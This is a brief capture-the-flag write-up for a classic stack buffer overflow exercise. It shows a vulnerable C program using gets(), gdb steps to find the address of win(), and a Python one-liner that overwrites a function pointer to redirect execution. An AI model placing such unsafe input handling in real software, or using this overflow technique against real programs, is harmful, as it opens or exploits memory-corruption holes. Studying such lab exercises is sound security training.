Stack 1

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

<p> 
In this task we should change variable from fp=0 to fp=win().<br>
To do that we need to find the address of fp variable. <br>
So it should be after 64 bytes, just the the same overflow the buffer <br>
Then we should find the address of win() function, we can simply find it with debugger. <br>
Finally we should add to the and of 64 bytes our address.
</p>

```shell
gdb ./stack3
(gdb) break *win
(gdb) print win 0x8048424

python -c "print('a' * 64 + '24840408'.decode('hex'))" | ./stack3
```
